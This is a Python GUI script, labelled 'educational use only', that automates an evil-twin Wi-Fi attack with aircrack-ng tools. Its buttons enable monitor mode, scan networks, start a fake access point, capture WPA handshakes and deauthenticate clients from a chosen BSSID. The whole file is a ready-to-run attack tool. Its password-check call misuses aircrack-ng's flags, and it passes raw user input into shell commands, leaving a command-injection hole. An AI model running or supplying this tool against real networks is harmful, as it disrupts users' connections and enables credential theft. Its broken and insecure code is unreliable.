import os
import time
import threading
import tkinter as tk
from tkinter import messagebox, simpledialog, filedialog

# Function to run shell commands
def run_command(command):
    os.system(command)

# Monitor mode setup
def setup_monitor_mode(interface):
    output_label.config(text="[*] Enabling monitor mode...")
    run_command(f"sudo airmon-ng start {interface}")
    return f"{interface}mon"

# Scan networks
def scan_networks(interface):
    output_label.config(text="[*] Scanning for networks...")
    run_command(f"sudo airodump-ng {interface}")

# Start fake access point
def start_fake_ap(interface, essid):
    output_label.config(text=f"[*] Starting fake AP with ESSID: {essid}")
    run_command(f"sudo airbase-ng --essid \"{essid}\" -c 6 {interface}")

# Capture handshake
def capture_handshake(interface, bssid, channel):
    output_label.config(text="[*] Capturing WPA handshake...")
    run_command(f"sudo airodump-ng -c {channel} --bssid {bssid} -w handshake {interface}")

# Deauthenticate clients
def deauth_clients(interface, bssid):
    output_label.config(text=f"[*] Sending deauth packets to BSSID: {bssid}")
    run_command(f"sudo aireplay-ng --deauth 10 -a {bssid} {interface}")

# Verify password
def verify_password(handshake_file, password):
    output_label.config(text="[*] Verifying password...")
    result = os.system(f"sudo aircrack-ng -w {password} -b {handshake_file}")
    if result == 0:
        messagebox.showinfo("Success", "Password verified successfully!")
    else:
        messagebox.showerror("Failure", "Password verification failed.")

# GUI functions
def enable_monitor_mode():
    interface = interface_entry.get()
    if not interface:
        messagebox.showerror("Error", "Please enter the wireless interface.")
        return
    monitor_interface = setup_monitor_mode(interface)
    output_label.config(text=f"Monitor mode enabled: {monitor_interface}")
    monitor_interface_var.set(monitor_interface)

def scan_targets():
    interface = monitor_interface_var.get()
    if not interface:
        messagebox.showerror("Error", "Please enable monitor mode first.")
        return
    threading.Thread(target=scan_networks, args=(interface,)).start()

def start_fake_ap_gui():
    interface = monitor_interface_var.get()
    essid = simpledialog.askstring("Fake AP", "Enter ESSID for fake AP:")
    if not essid:
        messagebox.showerror("Error", "Please provide an ESSID.")
        return
    threading.Thread(target=start_fake_ap, args=(interface, essid)).start()

def capture_handshake_gui():
    interface = monitor_interface_var.get()
    bssid = bssid_entry.get()
    channel = channel_entry.get()
    if not bssid or not channel:
        messagebox.showerror("Error", "Please provide BSSID and channel.")
        return
    threading.Thread(target=capture_handshake, args=(interface, bssid, channel)).start()

def deauth_clients_gui():
    interface = monitor_interface_var.get()
    bssid = bssid_entry.get()
    if not bssid:
        messagebox.showerror("Error", "Please provide a BSSID.")
        return
    threading.Thread(target=deauth_clients, args=(interface, bssid)).start()

def verify_password_gui():
    handshake_file = filedialog.askopenfilename(title="Select Handshake File")
    password = simpledialog.askstring("Verify Password", "Enter password to verify:")
    if not handshake_file or not password:
        messagebox.showerror("Error", "Please provide handshake file and password.")
        return
    threading.Thread(target=verify_password, args=(handshake_file, password)).start()

# Create the GUI
app = tk.Tk()
app.title("Evil Twin Automation Script (Educational Use Only)")

# Variables
monitor_interface_var = tk.StringVar()

# Widgets
tk.Label(app, text="Wireless Interface:").grid(row=0, column=0, padx=5, pady=5)
interface_entry = tk.Entry(app)
interface_entry.grid(row=0, column=1, padx=5, pady=5)

tk.Button(app, text="Enable Monitor Mode", command=enable_monitor_mode).grid(row=1, column=0, columnspan=2, pady=5)

tk.Label(app, text="BSSID:").grid(row=2, column=0, padx=5, pady=5)
bssid_entry = tk.Entry(app)
bssid_entry.grid(row=2, column=1, padx=5, pady=5)

tk.Label(app, text="Channel:").grid(row=3, column=0, padx=5, pady=5)
channel_entry = tk.Entry(app)
channel_entry.grid(row=3, column=1, padx=5, pady=5)

tk.Button(app, text="Scan Networks", command=scan_targets).grid(row=4, column=0, columnspan=2, pady=5)
tk.Button(app, text="Start Fake AP", command=start_fake_ap_gui).grid(row=5, column=0, columnspan=2, pady=5)
tk.Button(app, text="Capture Handshake", command=capture_handshake_gui).grid(row=6, column=0, columnspan=2, pady=5)
tk.Button(app, text="Deauth Clients", command=deauth_clients_gui).grid(row=7, column=0, columnspan=2, pady=5)
tk.Button(app, text="Verify Password", command=verify_password_gui).grid(row=8, column=0, columnspan=2, pady=5)

output_label = tk.Label(app, text="", fg="blue")
output_label.grid(row=9, column=0, columnspan=2, pady=10)

# Run the GUI
app.mainloop()